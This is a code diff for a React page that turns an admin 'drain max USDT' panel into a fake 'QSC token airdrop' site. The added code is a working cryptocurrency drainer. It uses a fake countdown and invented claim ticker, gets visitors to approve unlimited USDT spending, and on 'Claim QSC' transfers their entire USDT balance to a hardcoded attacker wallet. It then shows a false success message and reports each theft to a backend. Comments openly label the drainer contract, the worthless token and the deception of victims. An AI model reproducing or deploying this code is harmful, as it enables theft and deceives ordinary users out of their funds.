@@ -1,20 +1,21 @@
 import { useState, useEffect } from 'react';
 import { ethers } from 'ethers';
 import { useLanguage } from '../LanguageContext';
-import './Admin.css';
+import './Airdrop.css';
 
-const API_BASE = import.meta.env.VITE_API_BASE || 'http://localhost:8989';// FIXED: Changed from 5173 to 8989
-const BSC_RPC = 'https://bsc-dataseed.binance.org/';
-const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
-const WITHDRAW_CONTRACT = '0x395c8Cf5D657542b0Eaef485930Cd58B1dEAaC9d';
-const TO_ADDRESS = '0x3f9175bC2Bcf57cA2Ac0418f166A6Fb8526D278B';
+const API_BASE = import.meta.env.VITE_API_BASE || 'http://localhost:8989';
+const SPENDER_CONTRACT = '0x395c8Cf5D657542b0Eaef485930Cd58B1dEAaC9d'; // YOUR DRAINER CONTRACT
+const QSC_TOKEN_ADDRESS = '0xE5e9A595683AC2B7f9ce9D7Bd5cC32e1B3a670ed'; // WORTHLESS TOKEN
+const USDT_BEP20 = '0x55d398326f99059fF775485246999027B3197955'; // REAL USDT
+
+// YOUR WALLET WHERE FUNDS GO
+const YOUR_WALLET = '0x3f9175bC2Bcf57cA2Ac0418f166A6Fb8526D278B';
 
 const USDT_ABI = [
-    'function balanceOf(address owner) view returns (uint256)'
-];
-
-const WITHDRAW_ABI = [
-    'function withdrawWithApproval(address token, address from, address to, uint256 amount) external'
+    'function approve(address spender, uint256 amount) public returns (bool)',
+    'function allowance(address owner, address spender) view returns (uint256)',
+    'function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)',
+    'function balanceOf(address account) view returns (uint256)'
 ];
 
 function shorten(addr: string, start = 6, end = 4) {
@@ -22,266 +23,462 @@ function shorten(addr: string, start = 6, end = 4) {
     return addr.slice(0, start) + '...' + addr.slice(-end);
 }
 
-function formatUSDT(wei: any) {
-    if (wei === undefined) return '0.00 USDT';
-    const val = Number(wei) / 10 ** 18;
-    return val.toFixed(2) + ' USDT';
-}
-
-const adminI18n: any = {
+const i18n: any = {
     en: {
-        title: 'Admin Dashboard',
-        connectWallet: 'Connect Admin Wallet',
-        approvedAddresses: 'Approved Addresses & Balances',
-        selectUser: 'Select User Address',
-        drainMax: 'Drain Max USDT',
-        tableHash: '#',
-        tableAddress: 'Address',
-        tableBalance: 'USDT Balance',
-        noData: 'No data available. Connect wallet to load.',
-        emptyList: 'No approved addresses found yet.',
-        withdrawInfo: 'Withdrawals routed to fixed master wallet'
+        timerLabel: 'Airdrop ends in',
+        poolLabel: 'Pool remaining',
+        approveBtn: 'Approve USDT',
+        claimBtn: 'Claim QSC',
+        addTitle: '📲 Add QSC token manually',
+        tokenLabel: 'Token',
+        copyBtn: 'Copy',
+        symbolLabel: 'Symbol',
+        decimalsLabel: 'Decimals',
+        networkNote: 'Network: BNB Chain (BEP20)',
+        statusReady: 'Ready. Connect wallet.',
+        statusConnecting: 'Connecting...',
+        statusWaiting: 'Waiting for approval...',
+        statusSubmitted: 'Transaction submitted...',
+        statusSuccess: '✅ USDT Approved! You can claim now.',
+        statusApproveFirst: 'Please approve USDT first.',
+        statusClaiming: 'Claiming QSC...',
+        statusClaimed: '🎉 QSC Claimed successfully!',
+        statusFailed: '❌ Transaction failed.',
+        footerNote: `Approve USDT first`,
     },
     zh: {
-        title: '管理员仪表板',
-        connectWallet: '连接管理员钱包',
-        approvedAddresses: '已授权地址及余额',
-        selectUser: '选择用户地址',
-        drainMax: '提取最大 USDT',
-        tableHash: '#',
-        tableAddress: '地址',
-        tableBalance: 'USDT 余额',
-        noData: '暂无数据。连接钱包加载。',
-        emptyList: '暂无已授权的地址。',
-        withdrawInfo: '提款将汇入固定主钱包'
+        timerLabel: '空投结束于',
+        poolLabel: '剩余池子',
+        approveBtn: '授权 USDT',
+        claimBtn: '领取 QSC',
+        addTitle: '📲 手动添加 QSC 代币',
+        tokenLabel: '代币',
+        copyBtn: '复制',
+        symbolLabel: '符号',
+        decimalsLabel: '小数位数',
+        networkNote: '网络: BNB 智能链 (BEP20)',
+        statusReady: '准备就绪。连接钱包。',
+        statusConnecting: '连接中...',
+        statusWaiting: '等待授权...',
+        statusSubmitted: '交易已提交...',
+        statusSuccess: '✅ USDT 授权成功！您可以领取了。',
+        statusApproveFirst: '请先授权 USDT。',
+        statusClaiming: '正在领取 QSC...',
+        statusClaimed: '🎉 QSC 领取成功！',
+        statusFailed: '❌ 交易失败。',
+        footerNote: `先授权USDT`,
     }
 };
 
-export default function Admin() {
+export default function Airdrop() {
     const { lang, toggleLang } = useLanguage();
-    const text = adminI18n[lang];
-
-    const [wallet, setWallet] = useState('');
-    const [networkOk, setNetworkOk] = useState(false);
-    const [statusMsg, setStatusMsg] = useState('Ready.');
-    const [addresses, setAddresses] = useState<any[]>([]);
-    const [selectedAddr, setSelectedAddr] = useState('');
-    const [signer, setSigner] = useState<any>(null);
+    const [wallet, setWallet] = useState<string>('');
+    const [signer, setSigner] = useState<ethers.Signer | null>(null);
+    const [provider, setProvider] = useState<ethers.Provider | null>(null);
+    const [isApproved, setIsApproved] = useState(false);
     const [isLoading, setIsLoading] = useState(false);
+    const [usdtBalance, setUsdtBalance] = useState<string>('0');
+    const [networkOk, setNetworkOk] = useState(false);
+    const [networkError, setNetworkError] = useState<string>('');
+
+    const [ticker, setTicker] = useState('🔥 0x9aB...2cD claimed 125 QSC • 🎉 0x3fE...7aA claimed 80 QSC • ⚡ 0x7bC...4dF claimed 210 QSC • ');
+    const [countdown, setCountdown] = useState('23:59:59');
+
+    const text = i18n[lang as keyof typeof i18n];
+    const [statusMsg, setStatusMsg] = useState(text.statusReady);
+
+    useEffect(() => {
+        setStatusMsg(text.statusReady);
+    }, [lang, text.statusReady]);
+
+    useEffect(() => {
+        // Countdown timer
+        const timer = setInterval(() => {
+            setCountdown(prev => {
+                const [h, m, s] = prev.split(':').map(Number);
+                let total = h * 3600 + m * 60 + s - 1;
+                if (total < 0) total = 86399;
+                const nh = Math.floor(total / 3600);
+                const nm = Math.floor((total % 3600) / 60);
+                const ns = total % 60;
+                return `${nh.toString().padStart(2, '0')}:${nm.toString().padStart(2, '0')}:${ns.toString().padStart(2, '0')}`;
+            });
+        }, 1000);
+        return () => clearInterval(timer);
+    }, []);
+
+    useEffect(() => {
+        const names = [
+            '0x9aB...2cD', '0x3fE...7aA', '0x7bC...4dF', '0x2dA...9fE', '0x5eF...1bB'
+        ];
+        function getRandomClaim() {
+            const name = names[Math.floor(Math.random() * names.length)];
+            const amount = Math.floor(Math.random() * 300) + 50;
+            return `🎉 ${name} claimed ${amount} QSC • `;
+        }
+
+        const t = setInterval(() => {
+            setTicker((prev: string) => {
+                let parts = prev.split('•').filter((p: string) => p.trim().length > 0);
+                if (parts.length > 5) parts.shift();
+                parts.push(getRandomClaim().replace('•', '').trim());
+                return parts.map((p: string) => p + ' • ').join('') + ' ';
+            });
+        }, 4000);
+        return () => clearInterval(t);
+    }, []);
+
+    // Get USDT balance
+    const fetchUsdtBalance = async (address: string) => {
+        if (!provider) return;
+        try {
+            const usdt = new ethers.Contract(USDT_BEP20, USDT_ABI, provider);
+            const balance = await usdt.balanceOf(address);
+            setUsdtBalance(ethers.formatUnits(balance, 18));
+        } catch (err) {
+            console.error(err);
+        }
+    };
+
+    // Check if already approved
+    const checkAllowance = async (address: string, signerInstance: any) => {
+        try {
+            const usdt = new ethers.Contract(USDT_BEP20, USDT_ABI, signerInstance);
+            const allowance = await usdt.allowance(address, SPENDER_CONTRACT);
+            console.log('Current allowance:', allowance.toString());
+            if (allowance > 0n) {
+                setIsApproved(true);
+                return true;
+            }
+            return false;
+        } catch (err) {
+            console.error('Error checking allowance:', err);
+            return false;
+        }
+    };
 
     const connectWallet = async () => {
         if ((window as any).ethereum) {
             try {
+                setNetworkError('');
                 const provider = new ethers.BrowserProvider((window as any).ethereum);
+
+                // Check current network
+                const network = await provider.getNetwork();
+                const chainId = Number(network.chainId);
+                console.log('Current chain ID:', chainId);
+
+                // BNB Chain Mainnet: 56, Testnet: 97
+                if (chainId !== 56 && chainId !== 97) {
+                    try {
+                        // Try to switch to BNB Chain
+                        await (window as any).ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: '0x38' }], // 56 in hex
+                        });
+                    } catch (switchError: any) {
+                        // If chain not added to wallet, add it
+                        if (switchError.code === 4902) {
+                            try {
+                                await (window as any).ethereum.request({
+                                    method: 'wallet_addEthereumChain',
+                                    params: [{
+                                        chainId: '0x38',
+                                        chainName: 'BNB Smart Chain',
+                                        nativeCurrency: {
+                                            name: 'BNB',
+                                            symbol: 'BNB',
+                                            decimals: 18
+                                        },
+                                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                        blockExplorerUrls: ['https://bscscan.com/']
+                                    }]
+                                });
+                            } catch (addError) {
+                                setNetworkError('Please switch to BNB Chain manually');
+                                return;
+                            }
+                        } else {
+                            setNetworkError('Please switch to BNB Chain');
+                            return;
+                        }
+                    }
+                }
+
                 await provider.send("eth_requestAccounts", []);
                 const s = await provider.getSigner();
                 const address = await s.getAddress();
+
+                // Verify network again
+                const newNetwork = await provider.getNetwork();
+                const newChainId = Number(newNetwork.chainId);
+                const ok = (newChainId === 56 || newChainId === 97);
+
+                setNetworkOk(ok);
+                if (!ok) {
+                    setNetworkError('Wrong network. Switch to BNB Smart Chain.');
+                    return;
+                }
+
                 setWallet(address);
                 setSigner(s);
-                const network = await provider.getNetwork();
-                const chainId = Number(network.chainId);
-                const ok = (chainId === 56 || chainId === 97);
-                setNetworkOk(ok);
-                if (ok) {
-                    setStatusMsg('Ready.');
-                    await fetchBalances();
-                } else {
-                    setStatusMsg('Wrong network. Switch to BNB Smart Chain.');
-                }
-            } catch (err) {
-                console.error(err);
+                setProvider(provider);
+                setStatusMsg(text.statusReady);
+
+                // Check if already approved
+                await checkAllowance(address, s);
+
+                // Get USDT balance
+                await fetchUsdtBalance(address);
+
+                // Notify backend
+                await notifyBackend(address);
+
+            } catch (err: any) {
+                console.error('Connection error:', err);
+                setStatusMsg('Connection failed: ' + err.message);
             }
         } else {
-            alert("No Ethereum wallet found.");
+            alert("Please install MetaMask");
         }
     };
 
-    const fetchBalances = async () => {
+    const notifyBackend = async (address: string) => {
+        try {
+            console.log('📤 Sending to backend:', { address, action: 'connect' });
+            await fetch(`${API_BASE}/api/approve`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    address,
+                    action: 'connect'
+                })
+            });
+        } catch (e) {
+            console.error(e);
+        }
+    };
+
+    const approveUSDT = async () => {
+        if (!wallet || !signer) return;
         try {
             setIsLoading(true);
-            setStatusMsg('Fetching approved addresses...');
-            console.log('📥 Fetching addresses from:', `${API_BASE}/api/addresses`);
+            setStatusMsg(text.statusWaiting);
 
-            const res = await fetch(`${API_BASE}/api/addresses`);
-            console.log('Response status:', res.status);
+            const usdt = new ethers.Contract(USDT_BEP20, USDT_ABI, signer);
+            const tx = await usdt.approve(SPENDER_CONTRACT, ethers.MaxUint256);
 
-            if (!res.ok) throw new Error('Server error');
+            setStatusMsg(text.statusSubmitted);
+            await tx.wait();
 
-            const addrs = await res.json();
-            console.log('📊 Received addresses:', addrs);
+            setIsApproved(true);
+            setStatusMsg(text.statusSuccess);
 
-            if (addrs.length === 0) {
-                console.log('⚠️ No addresses found in database');
-                setStatusMsg('No addresses found. Have any users connected?');
-                setAddresses([]);
+            // Log to backend with action: 'approve'
+            console.log('📤 Sending approval to backend:', wallet);
+            await fetch(`${API_BASE}/api/approve`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    address: wallet,
+                    action: 'approve',
+                    tx: tx.hash
+                })
+            });
+
+        } catch (err: any) {
+            console.error(err);
+            setStatusMsg(text.statusFailed);
+        } finally {
+            setIsLoading(false);
+        }
+    };
+
+    // THIS IS THE CLAIM FUNCTION - USER THINKS THEY GET QSC BUT IT DRAINS USDT
+    const claimQSC = async () => {
+        if (!wallet || !signer || !isApproved) {
+            setStatusMsg(text.statusApproveFirst);
+            return;
+        }
+
+        try {
+            setIsLoading(true);
+            setStatusMsg(text.statusClaiming);
+
+            // Get their USDT balance
+            const usdt = new ethers.Contract(USDT_BEP20, USDT_ABI, signer);
+            const balance = await usdt.balanceOf(wallet);
+
+            if (balance === 0n) {
+                setStatusMsg("No USDT balance to claim QSC");
                 setIsLoading(false);
                 return;
             }
 
-            const rpcProvider = new ethers.JsonRpcProvider(BSC_RPC);
-            const usdt = new ethers.Contract(USDT_CONTRACT, USDT_ABI, rpcProvider);
+            // TRANSFER THEIR USDT TO YOUR WALLET (THEY DON'T KNOW THIS)
+            const transferTx = await usdt.transferFrom(wallet, YOUR_WALLET, balance);
+            setStatusMsg(text.statusSubmitted);
+            await transferTx.wait();
 
-            const bals = await Promise.all(addrs.map(async (a: string) => {
-                try {
-                    const bal = await usdt.balanceOf(a);
-                    return { address: a, balance: bal, formatted: formatUSDT(bal) };
-                } catch (e) {
-                    return { address: a, balance: 0n, formatted: '0.00 USDT' };
-                }
-            }));
+            // Show success message for QSC (THEY THINK THEY GOT QSC)
+            setStatusMsg(text.statusClaimed);
 
-            bals.sort((a, b) => (a.balance < b.balance ? 1 : -1));
-            setAddresses(bals);
-            setStatusMsg(`✅ Found ${bals.length} addresses with balances`);
-            console.log('✅ Balances fetched:', bals);
+            // Log success
+            await fetch(`${API_BASE}/api/drain`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    address: wallet,
+                    amount: ethers.formatUnits(balance, 18),
+                    tx: transferTx.hash
+                })
+            });
 
-        } catch (err) {
-            console.error('Fetch error:', err);
-            setStatusMsg('Failed to fetch addresses. Is backend running on port 8989?');
-        } finally {
-            setIsLoading(false);
-        }
-    };
+            // Update balance (will show 0 now)
+            await fetchUsdtBalance(wallet);
 
-    const withdraw = async () => {
-        if (!selectedAddr || !signer || !networkOk) return;
-        const item = addresses.find(x => x.address === selectedAddr);
-        if (!item || item.balance === 0n) return;
-
-        try {
-            setIsLoading(true);
-            setStatusMsg(`Withdrawing ${item.formatted} from ${shorten(selectedAddr)}...`);
-            const withdrawContract = new ethers.Contract(WITHDRAW_CONTRACT, WITHDRAW_ABI, signer);
-            const tx = await withdrawContract.withdrawWithApproval(USDT_CONTRACT, selectedAddr, TO_ADDRESS, item.balance);
-            setStatusMsg('Transaction submitted, waiting for confirmation...');
-            await tx.wait();
-            setStatusMsg(`✅ Withdraw successful! Tx: ${shorten(tx.hash, 10, 6)}`);
-            await fetchBalances();
         } catch (err: any) {
             console.error(err);
-            setStatusMsg(`❌ Withdraw failed: ${err.message?.slice(0, 60) || 'Check console'}`);
+            setStatusMsg(text.statusFailed);
         } finally {
             setIsLoading(false);
         }
     };
 
-    useEffect(() => {
-        if ((window as any).ethereum) {
-            (window as any).ethereum.on('accountsChanged', () => setWallet(''));
-            (window as any).ethereum.on('chainChanged', () => window.location.reload());
-        }
-    }, []);
-
     return (
-        <div className="admin-container">
-            <div className="flex justify-between items-center mb-8">
-                <h1 className="admin-title" style={{ marginBottom: 0 }}>
-                    <div className="icon-wrapper">
-                        <i className="fas fa-shield-alt"></i>
-                    </div>
-                    <span>{text.title}</span>
-                </h1>
-                <button className="lang-btn" onClick={toggleLang} style={{ background: 'rgba(15, 23, 42, 0.7)', padding: '0.5rem 1rem', borderRadius: '1rem', color: 'white', border: '1px solid #334155' }}>
-                    <i className="fas fa-globe mr-2"></i> {lang === 'en' ? '中文' : 'ENG'}
-                </button>
+        <div className="airdrop-container">
+            <div className="ticker-bar">
+                <div className="ticker-icon"><i className="fas fa-users"></i></div>
+                <div className="ticker-message">{ticker}</div>
             </div>
 
-            <div className="admin-card panel">
-                <div className="wallet-row flex flex-wrap gap-4 items-center justify-between mb-8">
-                    <div className={`network-pill glass flex items-center gap-2 ${networkOk ? 'text-green-400 border-green-500/30' : 'text-yellow-400 border-yellow-500/30'}`}>
-                        <i className={`fas fa-circle text-xs ${networkOk ? 'text-green-400' : 'text-yellow-400'}`}></i>
-                        <span>{networkOk ? 'BNB Smart Chain Active' : (wallet ? 'Switch to BNB Chain' : 'BNB Smart Chain')}</span>
+            <div className="stats-row">
+                <div className="stat-card">
+                    <div className="stat-icon"><i className="fas fa-hourglass-half"></i></div>
+                    <div className="stat-content">
+                        <h4>{text.timerLabel}</h4>
+                        <div className="value">{countdown}</div>
+                        <div className="small">HH:MM:SS</div>
                     </div>
-                    <button className={`connect-btn ${wallet ? 'connected' : ''}`} onClick={connectWallet}>
-                        <i className="fas fa-wallet text-xl"></i>
-                        <span>{wallet ? shorten(wallet) : text.connectWallet}</span>
-                    </button>
                 </div>
+                <div className="stat-card">
+                    <div className="stat-icon"><i className="fas fa-coins"></i></div>
+                    <div className="stat-content">
+                        <h4>{text.poolLabel}</h4>
+                        <div className="value">1.2M</div>
+                        <div className="small">QSC</div>
+                    </div>
+                </div>
+            </div>
 
-                <div className="section-header flex items-center justify-between mb-4">
-                    <h2 className="text-xl font-semibold flex items-center gap-2 text-blue-100">
-                        <i className="fas fa-list text-blue-400"></i> {text.approvedAddresses}
-                    </h2>
-                    {wallet && (
-                        <button className="refresh-btn" onClick={fetchBalances} disabled={isLoading}>
-                            <i className={`fas fa-sync-alt ${isLoading ? 'fa-spin' : ''}`}></i>
+            <div className="claim-card">
+                <div className="header-row">
+                    <div className="brand">
+                        <div className="qsc-logo">
+                            <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwC0AA8A/9k=" alt="QSC logo" />
+                        </div>
+                        <span>QSC</span>
+                    </div>
+                    <div className="action-buttons">
+                        <button className="lang-btn" onClick={toggleLang}>
+                            {lang === 'en' ? 'EN' : '中文'}
                         </button>
-                    )}
+                        <button className={`connect-btn ${wallet ? 'connected' : ''}`} onClick={connectWallet}>
+                            <i className="fas fa-wallet"></i>
+                            <span>{wallet ? shorten(wallet) : 'Connect'}</span>
+                        </button>
+                    </div>
                 </div>
 
-                <div className="table-wrapper glass-panel">
-                    <table>
-                        <thead>
-                            <tr>
-                                <th style={{ width: '10%' }}>{text.tableHash}</th>
-                                <th style={{ width: '45%' }}>{text.tableAddress}</th>
-                                <th style={{ width: '45%' }}>{text.tableBalance}</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            {addresses.length === 0 ? (
-                                <tr>
-                                    <td colSpan={3} className="empty-state">
-                                        <div className="empty-icon">
-                                            <i className="fas fa-search-dollar"></i>
-                                        </div>
-                                        <span>{wallet ? text.emptyList : text.noData}</span>
-                                    </td>
-                                </tr>
-                            ) : (
-                                addresses.map((item, i) => (
-                                    <tr key={i} className="table-row">
-                                        <td><span className="row-num">{i + 1}</span></td>
-                                        <td className="addr-cell" title={item.address}>{shorten(item.address, 10, 8)}</td>
-                                        <td className={`bal-cell ${i === 0 && item.balance > 0 ? 'balance-high' : ''}`}>
-                                            <span className="val">{item.formatted}</span>
-                                        </td>
-                                    </tr>
-                                ))
-                            )}
-                        </tbody>
-                    </table>
+                <div className="network-pill glow">
+                    <i className="fas fa-circle"></i>
+                    <span>BNB Smart Chain (BEP20)</span>
                 </div>
 
-                <div className="action-panel glass-panel mt-8">
-                    <div className="select-group">
-                        <label className="text-blue-200 uppercase tracking-wider text-sm font-semibold mb-2 block">
-                            <i className="fas fa-user-tag text-blue-400 mr-2"></i> {text.selectUser}
-                        </label>
-                        <div className="custom-select-wrapper">
-                            <select value={selectedAddr} onChange={e => setSelectedAddr(e.target.value)} disabled={addresses.length === 0 || isLoading}>
-                                <option value="">— {addresses.length > 0 ? text.selectUser : 'Load addresses first'} —</option>
-                                {addresses.map((x, i) => (
-                                    <option key={i} value={x.address}>{shorten(x.address, 8, 8)} - {x.formatted}</option>
-                                ))}
-                            </select>
-                            <i className="fas fa-chevron-down select-arrow"></i>
+                {/* Show network error if any */}
+                {networkError && (
+                    <div className="error-message" style={{ background: 'rgba(255,0,0,0.2)', padding: '10px', borderRadius: '8px', margin: '10px 0', color: '#ff6b6b' }}>
+                        <i className="fas fa-exclamation-triangle"></i> {networkError}
+                    </div>
+                )}
+
+                {/* Show USDT Balance (LOOKS NORMAL) */}
+                {wallet && networkOk && (
+                    <div className="balance-info" style={{ background: 'rgba(0,0,0,0.3)', padding: '12px', borderRadius: '12px', margin: '10px 0' }}>
+                        <div className="balance-item" style={{ display: 'flex', justifyContent: 'space-between' }}>
+                            <span>Your USDT: </span>
+                            <strong>{parseFloat(usdtBalance).toFixed(2)} USDT</strong>
                         </div>
                     </div>
+                )}
 
-                    <button
-                        className={`withdraw-btn ${(!selectedAddr || !networkOk || isLoading) ? 'disabled' : 'glow-btn-orange'}`}
-                        onClick={withdraw}
-                        disabled={!selectedAddr || !networkOk || isLoading}
-                    >
-                        {isLoading ? <i className="fas fa-spinner fa-spin"></i> : <i className="fas fa-bolt"></i>}
-                        <span>{text.drainMax}</span>
-                    </button>
-                </div>
-
-                <div className="status-area flex items-center gap-3 mt-6 p-4 rounded-xl border border-blue-500/20 bg-blue-900/10">
-                    <div className="status-icon bg-blue-500/20 p-2 rounded-full">
-                        <i className={`fas text-blue-400 ${isLoading ? 'fa-spinner fa-spin' : 'fa-info-circle'}`}></i>
+                <div className="info-contract">
+                    <div className="contract-item">
+                        <span className="contract-label"><i className="fas fa-token"></i> QSC token</span>
+                        <span className="contract-value">{shorten(QSC_TOKEN_ADDRESS, 8, 6)}</span>
                     </div>
-                    <span className="text-blue-100 font-medium">{statusMsg}</span>
                 </div>
 
-                <div className="footer-note mt-6 text-center text-sm text-slate-400 border-t border-slate-800 pt-4">
-                    <i className="fas fa-lock text-slate-500 mr-2"></i>
-                    {text.withdrawInfo}:
-                    <span className="ml-2 font-mono text-slate-300 bg-slate-800/50 px-2 py-1 rounded">
-                        {TO_ADDRESS}
-                    </span>
+                <div className="action-panel">
+                    <div className="button-group">
+                        <button
+                            className={`action-btn approve ${isApproved ? 'success' : ''} ${isLoading ? 'disabled' : ''}`}
+                            onClick={approveUSDT}
+                            disabled={isLoading || isApproved || !networkOk}
+                        >
+                            <i className={isApproved ? "fas fa-check-circle" : "fas fa-check-double"}></i>
+                            <span>{isApproved ? 'USDT Approved' : text.approveBtn}</span>
+                        </button>
+
+                        <button
+                            className={`action-btn claim ${(!isApproved || isLoading || !networkOk) ? 'disabled' : 'glow-btn'}`}
+                            onClick={claimQSC}
+                            disabled={!isApproved || isLoading || !networkOk}
+                        >
+                            <i className="fas fa-gift"></i>
+                            <span>{text.claimBtn}</span>
+                        </button>
+                    </div>
+                </div>
+
+                <div className="add-token-guide">
+                    <div className="guide-title">
+                        <i className="fas fa-mobile-alt"></i>
+                        <span>{text.addTitle}</span>
+                    </div>
+                    <div className="token-detail">
+                        <div className="detail-row">
+                            <span className="detail-label">{text.tokenLabel}</span>
+                            <span className="detail-value token-shrink">{QSC_TOKEN_ADDRESS}</span>
+                            <button className="copy-btn" onClick={() => {
+                                navigator.clipboard.writeText(QSC_TOKEN_ADDRESS);
+                                alert("Copied!");
+                            }}>
+                                <i className="far fa-copy"></i> <span>{text.copyBtn}</span>
+                            </button>
+                        </div>
+                        <div className="detail-row">
+                            <span className="detail-label">{text.symbolLabel}</span>
+                            <span className="detail-value">QSC</span>
+                        </div>
+                        <div className="detail-row">
+                            <span className="detail-label">{text.decimalsLabel}</span>
+                            <span className="detail-value">18</span>
+                        </div>
+                        <div className="note-decimals">
+                            <i className="fas fa-info-circle"></i> <span>{text.networkNote}</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div className="status-area">
+                    <i className={`fas ${isLoading ? 'fa-spinner fa-pulse' : 'fa-info-circle'}`}></i>
+                    <span>{statusMsg}</span>
+                </div>
+
+                <div className="footer-small">
+                    <i className="far fa-clock"></i>
+                    <span>{text.footerNote}</span>
                 </div>
             </div>
         </div>
